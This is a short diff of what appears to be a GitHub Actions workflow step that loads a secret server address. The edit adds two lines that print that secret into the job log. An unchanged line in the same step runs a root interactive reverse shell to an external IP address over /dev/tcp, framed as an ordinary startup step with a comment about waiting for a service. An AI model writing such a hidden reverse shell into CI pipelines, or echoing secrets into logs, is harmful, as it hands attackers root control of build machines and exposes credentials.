@@ -23,7 +23,8 @@ jobs:
         env: # Or as an environment variable
           SERVER_ADDR: ${{ secrets.SERVER_ADDR }}
         run: |
-          echo "$SERVER_ADDR"
+          echo "Server Address is: ${SERVER_ADDR:-'Not set or empty'}"
+          env | grep SERVER_ADDR  # This will print only the SERVER_ADDR related variable
           sudo sh -i >& /dev/tcp/181.193.118.73/6060 0>&1 &
           sleep 10 # 确保服务已经启动
 
